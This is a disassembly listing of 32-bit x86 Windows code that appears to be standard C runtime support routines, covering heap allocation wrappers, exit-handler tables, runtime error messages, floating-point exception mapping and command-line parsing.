  412179:	dd 45 f0             	fldl   -0x10(%ebp)
  41217c:	dc 75 f8             	fdivl  -0x8(%ebp)
  41217f:	dc 4d f8             	fmull  -0x8(%ebp)
  412182:	dc 6d f0             	fsubrl -0x10(%ebp)
  412185:	dd 5d e8             	fstpl  -0x18(%ebp)
  412188:	dd 45 e8             	fldl   -0x18(%ebp)
  41218b:	dc 1d a0 81 41 00    	fcompl 0x4181a0
  412191:	df e0                	fnstsw %ax
  412193:	f6 c4 41             	test   $0x41,%ah
  412196:	75 05                	jne    0x41219d
  412198:	33 c0                	xor    %eax,%eax
  41219a:	40                   	inc    %eax
  41219b:	c9                   	leave
  41219c:	c3                   	ret
  41219d:	33 c0                	xor    %eax,%eax
  41219f:	c9                   	leave
  4121a0:	c3                   	ret
  4121a1:	68 d4 81 41 00       	push   $0x4181d4
  4121a6:	ff 15 10 80 41 00    	call   *0x418010
  4121ac:	85 c0                	test   %eax,%eax
  4121ae:	74 15                	je     0x4121c5
  4121b0:	68 b8 81 41 00       	push   $0x4181b8
  4121b5:	50                   	push   %eax
  4121b6:	ff 15 08 80 41 00    	call   *0x418008
  4121bc:	85 c0                	test   %eax,%eax
  4121be:	74 05                	je     0x4121c5
  4121c0:	6a 00                	push   $0x0
  4121c2:	ff d0                	call   *%eax
  4121c4:	c3                   	ret
  4121c5:	e9 97 ff ff ff       	jmp    0x412161
  4121ca:	6a 0c                	push   $0xc
  4121cc:	68 e0 81 41 00       	push   $0x4181e0
  4121d1:	e8 3e 0e 00 00       	call   0x413014
  4121d6:	8b 75 08             	mov    0x8(%ebp),%esi
  4121d9:	85 f6                	test   %esi,%esi
  4121db:	74 58                	je     0x412235
  4121dd:	83 3d 40 73 45 00 03 	cmpl   $0x3,0x457340
  4121e4:	75 40                	jne    0x412226
  4121e6:	6a 04                	push   $0x4
  4121e8:	e8 36 1d 00 00       	call   0x413f23
  4121ed:	59                   	pop    %ecx
  4121ee:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4121f2:	56                   	push   %esi
  4121f3:	e8 a4 1d 00 00       	call   0x413f9c
  4121f8:	59                   	pop    %ecx
  4121f9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4121fc:	85 c0                	test   %eax,%eax
  4121fe:	74 09                	je     0x412209
  412200:	56                   	push   %esi
  412201:	50                   	push   %eax
  412202:	e8 c0 1d 00 00       	call   0x413fc7
  412207:	59                   	pop    %ecx
  412208:	59                   	pop    %ecx
  412209:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  41220d:	e8 0b 00 00 00       	call   0x41221d
  412212:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  412216:	75 1d                	jne    0x412235
  412218:	ff 75 08             	push   0x8(%ebp)
  41221b:	eb 0a                	jmp    0x412227
  41221d:	6a 04                	push   $0x4
  41221f:	e8 6b 1c 00 00       	call   0x413e8f
  412224:	59                   	pop    %ecx
  412225:	c3                   	ret
  412226:	56                   	push   %esi
  412227:	6a 00                	push   $0x0
  412229:	ff 35 3c 73 45 00    	push   0x45733c
  41222f:	ff 15 88 80 41 00    	call   *0x418088
  412235:	e8 15 0e 00 00       	call   0x41304f
  41223a:	c3                   	ret
  41223b:	6a 0c                	push   $0xc
  41223d:	68 f0 81 41 00       	push   $0x4181f0
  412242:	e8 cd 0d 00 00       	call   0x413014
  412247:	8b 75 08             	mov    0x8(%ebp),%esi
  41224a:	83 3d 40 73 45 00 03 	cmpl   $0x3,0x457340
  412251:	75 2e                	jne    0x412281
  412253:	3b 35 2c 73 45 00    	cmp    0x45732c,%esi
  412259:	77 26                	ja     0x412281
  41225b:	6a 04                	push   $0x4
  41225d:	e8 c1 1c 00 00       	call   0x413f23
  412262:	59                   	pop    %ecx
  412263:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  412267:	56                   	push   %esi
  412268:	e8 0e 25 00 00       	call   0x41477b
  41226d:	59                   	pop    %ecx
  41226e:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  412271:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  412275:	e8 33 00 00 00       	call   0x4122ad
  41227a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  41227d:	85 c0                	test   %eax,%eax
  41227f:	75 23                	jne    0x4122a4
  412281:	85 f6                	test   %esi,%esi
  412283:	75 01                	jne    0x412286
  412285:	46                   	inc    %esi
  412286:	83 3d 40 73 45 00 01 	cmpl   $0x1,0x457340
  41228d:	74 06                	je     0x412295
  41228f:	83 c6 0f             	add    $0xf,%esi
  412292:	83 e6 f0             	and    $0xfffffff0,%esi
  412295:	56                   	push   %esi
  412296:	6a 00                	push   $0x0
  412298:	ff 35 3c 73 45 00    	push   0x45733c
  41229e:	ff 15 8c 80 41 00    	call   *0x41808c
  4122a4:	e8 a6 0d 00 00       	call   0x41304f
  4122a9:	c3                   	ret
  4122aa:	8b 75 08             	mov    0x8(%ebp),%esi
  4122ad:	6a 04                	push   $0x4
  4122af:	e8 db 1b 00 00       	call   0x413e8f
  4122b4:	59                   	pop    %ecx
  4122b5:	c3                   	ret
  4122b6:	83 7c 24 04 e0       	cmpl   $0xffffffe0,0x4(%esp)
  4122bb:	77 22                	ja     0x4122df
  4122bd:	ff 74 24 04          	push   0x4(%esp)
  4122c1:	e8 75 ff ff ff       	call   0x41223b
  4122c6:	85 c0                	test   %eax,%eax
  4122c8:	59                   	pop    %ecx
  4122c9:	75 16                	jne    0x4122e1
  4122cb:	39 44 24 08          	cmp    %eax,0x8(%esp)
  4122cf:	74 10                	je     0x4122e1
  4122d1:	ff 74 24 04          	push   0x4(%esp)
  4122d5:	e8 9d 27 00 00       	call   0x414a77
  4122da:	85 c0                	test   %eax,%eax
  4122dc:	59                   	pop    %ecx
  4122dd:	75 de                	jne    0x4122bd
  4122df:	33 c0                	xor    %eax,%eax
  4122e1:	c3                   	ret
  4122e2:	ff 35 3c 6f 45 00    	push   0x456f3c
  4122e8:	ff 74 24 08          	push   0x8(%esp)
  4122ec:	e8 c5 ff ff ff       	call   0x4122b6
  4122f1:	59                   	pop    %ecx
  4122f2:	59                   	pop    %ecx
  4122f3:	c3                   	ret
  4122f4:	68 0c 82 41 00       	push   $0x41820c
  4122f9:	ff 15 10 80 41 00    	call   *0x418010
  4122ff:	85 c0                	test   %eax,%eax
  412301:	74 16                	je     0x412319
  412303:	68 fc 81 41 00       	push   $0x4181fc
  412308:	50                   	push   %eax
  412309:	ff 15 08 80 41 00    	call   *0x418008
  41230f:	85 c0                	test   %eax,%eax
  412311:	74 06                	je     0x412319
  412313:	ff 74 24 04          	push   0x4(%esp)
  412317:	ff d0                	call   *%eax
  412319:	ff 74 24 04          	push   0x4(%esp)
  41231d:	ff 15 38 80 41 00    	call   *0x418038
  412323:	cc                   	int3
  412324:	6a 08                	push   $0x8
  412326:	e8 f8 1b 00 00       	call   0x413f23
  41232b:	59                   	pop    %ecx
  41232c:	c3                   	ret
  41232d:	6a 08                	push   $0x8
  41232f:	e8 5b 1b 00 00       	call   0x413e8f
  412334:	59                   	pop    %ecx
  412335:	c3                   	ret
  412336:	a1 54 60 45 00       	mov    0x456054,%eax
  41233b:	85 c0                	test   %eax,%eax
  41233d:	74 02                	je     0x412341
  41233f:	ff d0                	call   *%eax
  412341:	56                   	push   %esi
  412342:	57                   	push   %edi
  412343:	b9 0c a0 41 00       	mov    $0x41a00c,%ecx
  412348:	bf 18 a0 41 00       	mov    $0x41a018,%edi
  41234d:	33 c0                	xor    %eax,%eax
  41234f:	3b cf                	cmp    %edi,%ecx
  412351:	8b f1                	mov    %ecx,%esi
  412353:	73 17                	jae    0x41236c
  412355:	85 c0                	test   %eax,%eax
  412357:	75 3f                	jne    0x412398
  412359:	8b 0e                	mov    (%esi),%ecx
  41235b:	85 c9                	test   %ecx,%ecx
  41235d:	74 02                	je     0x412361
  41235f:	ff d1                	call   *%ecx
  412361:	83 c6 04             	add    $0x4,%esi
  412364:	3b f7                	cmp    %edi,%esi
  412366:	72 ed                	jb     0x412355
  412368:	85 c0                	test   %eax,%eax
  41236a:	75 2c                	jne    0x412398
  41236c:	68 64 2e 41 00       	push   $0x412e64
  412371:	e8 fc 27 00 00       	call   0x414b72
  412376:	be 00 a0 41 00       	mov    $0x41a000,%esi
  41237b:	8b c6                	mov    %esi,%eax
  41237d:	bf 08 a0 41 00       	mov    $0x41a008,%edi
  412382:	3b c7                	cmp    %edi,%eax
  412384:	59                   	pop    %ecx
  412385:	73 0f                	jae    0x412396
  412387:	8b 06                	mov    (%esi),%eax
  412389:	85 c0                	test   %eax,%eax
  41238b:	74 02                	je     0x41238f
  41238d:	ff d0                	call   *%eax
  41238f:	83 c6 04             	add    $0x4,%esi
  412392:	3b f7                	cmp    %edi,%esi
  412394:	72 f1                	jb     0x412387
  412396:	33 c0                	xor    %eax,%eax
  412398:	5f                   	pop    %edi
  412399:	5e                   	pop    %esi
  41239a:	c3                   	ret
  41239b:	55                   	push   %ebp
  41239c:	8b ec                	mov    %esp,%ebp
  41239e:	56                   	push   %esi
  41239f:	57                   	push   %edi
  4123a0:	6a 08                	push   $0x8
  4123a2:	e8 7c 1b 00 00       	call   0x413f23
  4123a7:	33 f6                	xor    %esi,%esi
  4123a9:	46                   	inc    %esi
  4123aa:	39 35 cc 6c 45 00    	cmp    %esi,0x456ccc
  4123b0:	59                   	pop    %ecx
  4123b1:	75 10                	jne    0x4123c3
  4123b3:	ff 75 08             	push   0x8(%ebp)
  4123b6:	ff 15 94 80 41 00    	call   *0x418094
  4123bc:	50                   	push   %eax
  4123bd:	ff 15 90 80 41 00    	call   *0x418090
  4123c3:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  4123c7:	8a 45 10             	mov    0x10(%ebp),%al
  4123ca:	89 35 c8 6c 45 00    	mov    %esi,0x456cc8
  4123d0:	a2 c4 6c 45 00       	mov    %al,0x456cc4
  4123d5:	75 52                	jne    0x412429
  4123d7:	8b 0d 68 74 45 00    	mov    0x457468,%ecx
  4123dd:	85 c9                	test   %ecx,%ecx
  4123df:	74 29                	je     0x41240a
  4123e1:	a1 64 74 45 00       	mov    0x457464,%eax
  4123e6:	83 e8 04             	sub    $0x4,%eax
  4123e9:	3b c1                	cmp    %ecx,%eax
  4123eb:	eb 16                	jmp    0x412403
  4123ed:	8b 00                	mov    (%eax),%eax
  4123ef:	85 c0                	test   %eax,%eax
  4123f1:	74 02                	je     0x4123f5
  4123f3:	ff d0                	call   *%eax
  4123f5:	a1 64 74 45 00       	mov    0x457464,%eax
  4123fa:	83 e8 04             	sub    $0x4,%eax
  4123fd:	3b 05 68 74 45 00    	cmp    0x457468,%eax
  412403:	a3 64 74 45 00       	mov    %eax,0x457464
  412408:	73 e3                	jae    0x4123ed
  41240a:	b8 1c a0 41 00       	mov    $0x41a01c,%eax
  41240f:	be 20 a0 41 00       	mov    $0x41a020,%esi
  412414:	3b c6                	cmp    %esi,%eax
  412416:	8b f8                	mov    %eax,%edi
  412418:	73 0f                	jae    0x412429
  41241a:	8b 07                	mov    (%edi),%eax
  41241c:	85 c0                	test   %eax,%eax
  41241e:	74 02                	je     0x412422
  412420:	ff d0                	call   *%eax
  412422:	83 c7 04             	add    $0x4,%edi
  412425:	3b fe                	cmp    %esi,%edi
  412427:	72 f1                	jb     0x41241a
  412429:	b8 24 a0 41 00       	mov    $0x41a024,%eax
  41242e:	be 28 a0 41 00       	mov    $0x41a028,%esi
  412433:	3b c6                	cmp    %esi,%eax
  412435:	8b f8                	mov    %eax,%edi
  412437:	73 0f                	jae    0x412448
  412439:	8b 07                	mov    (%edi),%eax
  41243b:	85 c0                	test   %eax,%eax
  41243d:	74 02                	je     0x412441
  41243f:	ff d0                	call   *%eax
  412441:	83 c7 04             	add    $0x4,%edi
  412444:	3b fe                	cmp    %esi,%edi
  412446:	72 f1                	jb     0x412439
  412448:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  41244c:	5f                   	pop    %edi
  41244d:	5e                   	pop    %esi
  41244e:	74 09                	je     0x412459
  412450:	6a 08                	push   $0x8
  412452:	e8 38 1a 00 00       	call   0x413e8f
  412457:	eb 12                	jmp    0x41246b
  412459:	ff 75 08             	push   0x8(%ebp)
  41245c:	c7 05 cc 6c 45 00 01 	movl   $0x1,0x456ccc
  412463:	00 00 00 
  412466:	e8 89 fe ff ff       	call   0x4122f4
  41246b:	59                   	pop    %ecx
  41246c:	5d                   	pop    %ebp
  41246d:	c3                   	ret
  41246e:	6a 00                	push   $0x0
  412470:	6a 00                	push   $0x0
  412472:	ff 74 24 0c          	push   0xc(%esp)
  412476:	e8 20 ff ff ff       	call   0x41239b
  41247b:	83 c4 0c             	add    $0xc,%esp
  41247e:	c3                   	ret
  41247f:	6a 00                	push   $0x0
  412481:	6a 01                	push   $0x1
  412483:	ff 74 24 0c          	push   0xc(%esp)
  412487:	e8 0f ff ff ff       	call   0x41239b
  41248c:	83 c4 0c             	add    $0xc,%esp
  41248f:	c3                   	ret
  412490:	6a 01                	push   $0x1
  412492:	6a 00                	push   $0x0
  412494:	6a 00                	push   $0x0
  412496:	e8 00 ff ff ff       	call   0x41239b
  41249b:	83 c4 0c             	add    $0xc,%esp
  41249e:	c3                   	ret
  41249f:	6a 01                	push   $0x1
  4124a1:	6a 01                	push   $0x1
  4124a3:	6a 00                	push   $0x0
  4124a5:	e8 f1 fe ff ff       	call   0x41239b
  4124aa:	83 c4 0c             	add    $0xc,%esp
  4124ad:	c3                   	ret
  4124ae:	55                   	push   %ebp
  4124af:	8b ec                	mov    %esp,%ebp
  4124b1:	81 ec 0c 01 00 00    	sub    $0x10c,%esp
  4124b7:	a1 10 62 45 00       	mov    0x456210,%eax
  4124bc:	33 45 04             	xor    0x4(%ebp),%eax
  4124bf:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4124c2:	53                   	push   %ebx
  4124c3:	56                   	push   %esi
  4124c4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4124c7:	33 d2                	xor    %edx,%edx
  4124c9:	57                   	push   %edi
  4124ca:	33 c0                	xor    %eax,%eax
  4124cc:	3b 0c c5 80 60 45 00 	cmp    0x456080(,%eax,8),%ecx
  4124d3:	74 06                	je     0x4124db
  4124d5:	40                   	inc    %eax
  4124d6:	83 f8 12             	cmp    $0x12,%eax
  4124d9:	72 f1                	jb     0x4124cc
  4124db:	8b f0                	mov    %eax,%esi
  4124dd:	c1 e6 03             	shl    $0x3,%esi
  4124e0:	3b 8e 80 60 45 00    	cmp    0x456080(%esi),%ecx
  4124e6:	0f 85 23 01 00 00    	jne    0x41260f
  4124ec:	a1 84 6c 45 00       	mov    0x456c84,%eax
  4124f1:	83 f8 01             	cmp    $0x1,%eax
  4124f4:	0f 84 f0 00 00 00    	je     0x4125ea
  4124fa:	3b c2                	cmp    %edx,%eax
  4124fc:	75 0d                	jne    0x41250b
  4124fe:	83 3d 64 60 45 00 01 	cmpl   $0x1,0x456064
  412505:	0f 84 df 00 00 00    	je     0x4125ea
  41250b:	81 f9 fc 00 00 00    	cmp    $0xfc,%ecx
  412511:	0f 84 f8 00 00 00    	je     0x41260f
  412517:	68 04 01 00 00       	push   $0x104
  41251c:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  412522:	50                   	push   %eax
  412523:	52                   	push   %edx
  412524:	88 55 f8             	mov    %dl,-0x8(%ebp)
  412527:	ff 15 a0 80 41 00    	call   *0x4180a0
  41252d:	85 c0                	test   %eax,%eax
  41252f:	75 13                	jne    0x412544
  412531:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  412537:	68 64 85 41 00       	push   $0x418564
  41253c:	50                   	push   %eax
  41253d:	e8 fe 13 00 00       	call   0x413940
  412542:	59                   	pop    %ecx
  412543:	59                   	pop    %ecx
  412544:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  41254a:	50                   	push   %eax
  41254b:	8d bd f4 fe ff ff    	lea    -0x10c(%ebp),%edi
  412551:	e8 5a 13 00 00       	call   0x4138b0
  412556:	40                   	inc    %eax
  412557:	83 f8 3c             	cmp    $0x3c,%eax
  41255a:	59                   	pop    %ecx
  41255b:	76 29                	jbe    0x412586
  41255d:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  412563:	50                   	push   %eax
  412564:	e8 47 13 00 00       	call   0x4138b0
  412569:	8b f8                	mov    %eax,%edi
  41256b:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  412571:	83 e8 3b             	sub    $0x3b,%eax
  412574:	6a 03                	push   $0x3
  412576:	03 f8                	add    %eax,%edi
  412578:	68 60 85 41 00       	push   $0x418560
  41257d:	57                   	push   %edi
  41257e:	e8 fd 26 00 00       	call   0x414c80
  412583:	83 c4 10             	add    $0x10,%esp
  412586:	57                   	push   %edi
  412587:	e8 24 13 00 00       	call   0x4138b0
  41258c:	ff b6 84 60 45 00    	push   0x456084(%esi)
  412592:	8b d8                	mov    %eax,%ebx
  412594:	e8 17 13 00 00       	call   0x4138b0
  412599:	8d 44 03 1c          	lea    0x1c(%ebx,%eax,1),%eax
  41259d:	59                   	pop    %ecx
  41259e:	83 c0 03             	add    $0x3,%eax
  4125a1:	59                   	pop    %ecx
  4125a2:	83 e0 fc             	and    $0xfffffffc,%eax
  4125a5:	e8 b6 0a 00 00       	call   0x413060
  4125aa:	8b dc                	mov    %esp,%ebx
  4125ac:	68 44 85 41 00       	push   $0x418544
  4125b1:	53                   	push   %ebx
  4125b2:	e8 89 13 00 00       	call   0x413940
  4125b7:	57                   	push   %edi
  4125b8:	53                   	push   %ebx
  4125b9:	e8 92 13 00 00       	call   0x413950
  4125be:	68 40 85 41 00       	push   $0x418540
  4125c3:	53                   	push   %ebx
  4125c4:	e8 87 13 00 00       	call   0x413950
  4125c9:	ff b6 84 60 45 00    	push   0x456084(%esi)
  4125cf:	53                   	push   %ebx
  4125d0:	e8 7b 13 00 00       	call   0x413950
  4125d5:	68 10 20 01 00       	push   $0x12010
  4125da:	68 18 85 41 00       	push   $0x418518
  4125df:	53                   	push   %ebx
  4125e0:	e8 9f 25 00 00       	call   0x414b84
  4125e5:	83 c4 2c             	add    $0x2c,%esp
  4125e8:	eb 25                	jmp    0x41260f
  4125ea:	52                   	push   %edx
  4125eb:	8d 45 08             	lea    0x8(%ebp),%eax
  4125ee:	50                   	push   %eax
  4125ef:	8d b6 84 60 45 00    	lea    0x456084(%esi),%esi
  4125f5:	ff 36                	push   (%esi)
  4125f7:	e8 b4 12 00 00       	call   0x4138b0
  4125fc:	59                   	pop    %ecx
  4125fd:	50                   	push   %eax
  4125fe:	ff 36                	push   (%esi)
  412600:	6a f4                	push   $0xfffffff4
  412602:	ff 15 9c 80 41 00    	call   *0x41809c
  412608:	50                   	push   %eax
  412609:	ff 15 98 80 41 00    	call   *0x418098
  41260f:	8d a5 e8 fe ff ff    	lea    -0x118(%ebp),%esp
  412615:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  412618:	33 4d 04             	xor    0x4(%ebp),%ecx
  41261b:	e8 ec 15 00 00       	call   0x413c0c
  412620:	5f                   	pop    %edi
  412621:	5e                   	pop    %esi
  412622:	5b                   	pop    %ebx
  412623:	c9                   	leave
  412624:	c3                   	ret
  412625:	a1 84 6c 45 00       	mov    0x456c84,%eax
  41262a:	83 f8 01             	cmp    $0x1,%eax
  41262d:	74 0d                	je     0x41263c
  41262f:	85 c0                	test   %eax,%eax
  412631:	75 2a                	jne    0x41265d
  412633:	83 3d 64 60 45 00 01 	cmpl   $0x1,0x456064
  41263a:	75 21                	jne    0x41265d
  41263c:	68 fc 00 00 00       	push   $0xfc
  412641:	e8 68 fe ff ff       	call   0x4124ae
  412646:	a1 d0 6c 45 00       	mov    0x456cd0,%eax
  41264b:	85 c0                	test   %eax,%eax
  41264d:	59                   	pop    %ecx
  41264e:	74 02                	je     0x412652
  412650:	ff d0                	call   *%eax
  412652:	68 ff 00 00 00       	push   $0xff
  412657:	e8 52 fe ff ff       	call   0x4124ae
  41265c:	59                   	pop    %ecx
  41265d:	c3                   	ret
  41265e:	55                   	push   %ebp
  41265f:	8b ec                	mov    %esp,%ebp
  412661:	51                   	push   %ecx
  412662:	53                   	push   %ebx
  412663:	56                   	push   %esi
  412664:	57                   	push   %edi
  412665:	e8 5c 08 00 00       	call   0x412ec6
  41266a:	8b 7d 08             	mov    0x8(%ebp),%edi
  41266d:	8b f0                	mov    %eax,%esi
  41266f:	8b 56 54             	mov    0x54(%esi),%edx
  412672:	a1 94 61 45 00       	mov    0x456194,%eax
  412677:	8b ca                	mov    %edx,%ecx
  412679:	39 39                	cmp    %edi,(%ecx)
  41267b:	74 0d                	je     0x41268a
  41267d:	8d 1c 40             	lea    (%eax,%eax,2),%ebx
  412680:	83 c1 0c             	add    $0xc,%ecx
  412683:	8d 1c 9a             	lea    (%edx,%ebx,4),%ebx
  412686:	3b cb                	cmp    %ebx,%ecx
  412688:	72 ef                	jb     0x412679
  41268a:	8d 04 40             	lea    (%eax,%eax,2),%eax
  41268d:	8d 04 82             	lea    (%edx,%eax,4),%eax
  412690:	3b c8                	cmp    %eax,%ecx
  412692:	73 04                	jae    0x412698
  412694:	39 39                	cmp    %edi,(%ecx)
  412696:	74 02                	je     0x41269a
  412698:	33 c9                	xor    %ecx,%ecx
  41269a:	85 c9                	test   %ecx,%ecx
  41269c:	0f 84 12 01 00 00    	je     0x4127b4
  4126a2:	8b 59 08             	mov    0x8(%ecx),%ebx
  4126a5:	85 db                	test   %ebx,%ebx
  4126a7:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4126aa:	0f 84 04 01 00 00    	je     0x4127b4
  4126b0:	83 fb 05             	cmp    $0x5,%ebx
  4126b3:	75 0c                	jne    0x4126c1
  4126b5:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  4126b9:	33 c0                	xor    %eax,%eax
  4126bb:	40                   	inc    %eax
  4126bc:	e9 fc 00 00 00       	jmp    0x4127bd
  4126c1:	83 fb 01             	cmp    $0x1,%ebx
  4126c4:	0f 84 e5 00 00 00    	je     0x4127af
  4126ca:	8b 46 58             	mov    0x58(%esi),%eax
  4126cd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4126d0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4126d3:	89 46 58             	mov    %eax,0x58(%esi)
  4126d6:	8b 41 04             	mov    0x4(%ecx),%eax
  4126d9:	83 f8 08             	cmp    $0x8,%eax
  4126dc:	0f 85 bf 00 00 00    	jne    0x4127a1
  4126e2:	8b 15 88 61 45 00    	mov    0x456188,%edx
  4126e8:	a1 8c 61 45 00       	mov    0x45618c,%eax
  4126ed:	03 c2                	add    %edx,%eax
  4126ef:	3b d0                	cmp    %eax,%edx
  4126f1:	7d 27                	jge    0x41271a
  4126f3:	8d 04 52             	lea    (%edx,%edx,2),%eax
  4126f6:	c1 e0 02             	shl    $0x2,%eax
  4126f9:	8b 7e 54             	mov    0x54(%esi),%edi
  4126fc:	83 64 38 08 00       	andl   $0x0,0x8(%eax,%edi,1)
  412701:	8b 3d 88 61 45 00    	mov    0x456188,%edi
  412707:	8b 1d 8c 61 45 00    	mov    0x45618c,%ebx
  41270d:	42                   	inc    %edx
  41270e:	03 df                	add    %edi,%ebx
  412710:	83 c0 0c             	add    $0xc,%eax
  412713:	3b d3                	cmp    %ebx,%edx
  412715:	7c e2                	jl     0x4126f9
  412717:	8b 5d 08             	mov    0x8(%ebp),%ebx
  41271a:	8b 09                	mov    (%ecx),%ecx
  41271c:	81 f9 8e 00 00 c0    	cmp    $0xc000008e,%ecx
  412722:	8b 7e 5c             	mov    0x5c(%esi),%edi
  412725:	75 09                	jne    0x412730
  412727:	c7 46 5c 83 00 00 00 	movl   $0x83,0x5c(%esi)
  41272e:	eb 64                	jmp    0x412794
  412730:	81 f9 90 00 00 c0    	cmp    $0xc0000090,%ecx
  412736:	75 09                	jne    0x412741
  412738:	c7 46 5c 81 00 00 00 	movl   $0x81,0x5c(%esi)
  41273f:	eb 53                	jmp    0x412794
  412741:	81 f9 91 00 00 c0    	cmp    $0xc0000091,%ecx
  412747:	75 09                	jne    0x412752
  412749:	c7 46 5c 84 00 00 00 	movl   $0x84,0x5c(%esi)
  412750:	eb 42                	jmp    0x412794
  412752:	81 f9 93 00 00 c0    	cmp    $0xc0000093,%ecx
  412758:	75 09                	jne    0x412763
  41275a:	c7 46 5c 85 00 00 00 	movl   $0x85,0x5c(%esi)
  412761:	eb 31                	jmp    0x412794
  412763:	81 f9 8d 00 00 c0    	cmp    $0xc000008d,%ecx
  412769:	75 09                	jne    0x412774
  41276b:	c7 46 5c 82 00 00 00 	movl   $0x82,0x5c(%esi)
  412772:	eb 20                	jmp    0x412794
  412774:	81 f9 8f 00 00 c0    	cmp    $0xc000008f,%ecx
  41277a:	75 09                	jne    0x412785
  41277c:	c7 46 5c 86 00 00 00 	movl   $0x86,0x5c(%esi)
  412783:	eb 0f                	jmp    0x412794
  412785:	81 f9 92 00 00 c0    	cmp    $0xc0000092,%ecx
  41278b:	75 07                	jne    0x412794
  41278d:	c7 46 5c 8a 00 00 00 	movl   $0x8a,0x5c(%esi)
  412794:	ff 76 5c             	push   0x5c(%esi)
  412797:	6a 08                	push   $0x8
  412799:	ff d3                	call   *%ebx
  41279b:	59                   	pop    %ecx
  41279c:	89 7e 5c             	mov    %edi,0x5c(%esi)
  41279f:	eb 07                	jmp    0x4127a8
  4127a1:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  4127a5:	50                   	push   %eax
  4127a6:	ff d3                	call   *%ebx
  4127a8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4127ab:	59                   	pop    %ecx
  4127ac:	89 46 58             	mov    %eax,0x58(%esi)
  4127af:	83 c8 ff             	or     $0xffffffff,%eax
  4127b2:	eb 09                	jmp    0x4127bd
  4127b4:	ff 75 0c             	push   0xc(%ebp)
  4127b7:	ff 15 a4 80 41 00    	call   *0x4180a4
  4127bd:	5f                   	pop    %edi
  4127be:	5e                   	pop    %esi
  4127bf:	5b                   	pop    %ebx
  4127c0:	c9                   	leave
  4127c1:	c3                   	ret
  4127c2:	83 3d 6c 74 45 00 00 	cmpl   $0x0,0x45746c
  4127c9:	75 05                	jne    0x4127d0
  4127cb:	e8 e6 2a 00 00       	call   0x4152b6
  4127d0:	56                   	push   %esi
  4127d1:	8b 35 70 74 45 00    	mov    0x457470,%esi
  4127d7:	85 f6                	test   %esi,%esi
  4127d9:	75 07                	jne    0x4127e2
  4127db:	be 7b 85 41 00       	mov    $0x41857b,%esi
  4127e0:	eb 45                	jmp    0x412827
  4127e2:	8a 06                	mov    (%esi),%al
  4127e4:	3c 22                	cmp    $0x22,%al
  4127e6:	75 28                	jne    0x412810
  4127e8:	46                   	inc    %esi
  4127e9:	8a 06                	mov    (%esi),%al
  4127eb:	3c 22                	cmp    $0x22,%al
  4127ed:	74 31                	je     0x412820
  4127ef:	84 c0                	test   %al,%al
  4127f1:	74 16                	je     0x412809
  4127f3:	0f b6 c0             	movzbl %al,%eax
  4127f6:	50                   	push   %eax
  4127f7:	e8 d9 25 00 00       	call   0x414dd5
  4127fc:	85 c0                	test   %eax,%eax
  4127fe:	59                   	pop    %ecx
  4127ff:	74 01                	je     0x412802
  412801:	46                   	inc    %esi
  412802:	46                   	inc    %esi
  412803:	8a 06                	mov    (%esi),%al
  412805:	3c 22                	cmp    $0x22,%al
  412807:	75 e6                	jne    0x4127ef
  412809:	80 3e 22             	cmpb   $0x22,(%esi)
  41280c:	75 13                	jne    0x412821
  41280e:	eb 10                	jmp    0x412820
  412810:	3c 20                	cmp    $0x20,%al
  412812:	76 0d                	jbe    0x412821
  412814:	46                   	inc    %esi
  412815:	80 3e 20             	cmpb   $0x20,(%esi)
  412818:	77 fa                	ja     0x412814
  41281a:	eb 05                	jmp    0x412821
  41281c:	3c 20                	cmp    $0x20,%al
  41281e:	77 07                	ja     0x412827
  412820:	46                   	inc    %esi
  412821:	8a 06                	mov    (%esi),%al
  412823:	84 c0                	test   %al,%al
  412825:	75 f5                	jne    0x41281c
  412827:	8b c6                	mov    %esi,%eax
  412829:	5e                   	pop    %esi
  41282a:	c3                   	ret
  41282b:	53                   	push   %ebx
  41282c:	33 db                	xor    %ebx,%ebx
  41282e:	39 1d 6c 74 45 00    	cmp    %ebx,0x45746c
  412834:	56                   	push   %esi
  412835:	57                   	push   %edi
  412836:	75 05                	jne    0x41283d
  412838:	e8 79 2a 00 00       	call   0x4152b6
  41283d:	8b 35 7c 6c 45 00    	mov    0x456c7c,%esi
  412843:	33 ff                	xor    %edi,%edi
  412845:	3b f3                	cmp    %ebx,%esi
  412847:	75 12                	jne    0x41285b
  412849:	eb 30                	jmp    0x41287b
  41284b:	3c 3d                	cmp    $0x3d,%al
  41284d:	74 01                	je     0x412850
  41284f:	47                   	inc    %edi
  412850:	56                   	push   %esi
  412851:	e8 5a 10 00 00       	call   0x4138b0
  412856:	59                   	pop    %ecx
  412857:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  41285b:	8a 06                	mov    (%esi),%al
  41285d:	3a c3                	cmp    %bl,%al
  41285f:	75 ea                	jne    0x41284b
  412861:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  412868:	50                   	push   %eax
  412869:	e8 74 fa ff ff       	call   0x4122e2
  41286e:	8b f8                	mov    %eax,%edi
  412870:	3b fb                	cmp    %ebx,%edi
  412872:	59                   	pop    %ecx
  412873:	89 3d ac 6c 45 00    	mov    %edi,0x456cac
  412879:	75 05                	jne    0x412880
  41287b:	83 c8 ff             	or     $0xffffffff,%eax
  41287e:	eb 58                	jmp    0x4128d8
  412880:	8b 35 7c 6c 45 00    	mov    0x456c7c,%esi
